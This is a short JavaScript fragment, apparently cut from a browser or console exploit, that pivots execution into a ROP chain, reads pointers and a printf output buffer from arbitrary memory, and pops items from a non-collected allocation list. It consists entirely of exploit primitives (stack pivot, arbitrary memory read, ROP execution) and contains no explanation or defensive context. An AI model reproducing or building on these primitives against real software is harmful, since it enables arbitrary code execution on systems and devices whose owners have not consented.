pivot(ropchain);
var main_ret = read_ptr_at(main_ret);
var printf_buf_end = read_ptr_at(ropchain+printf_buf_offset);
var printf_ans = read_mem_as_string(printf_buf,printf_buf_end-printf_buf);
var _ = malloc_nogc.pop();
var _ = malloc_nogc.pop();
var _ = malloc_nogc.pop();
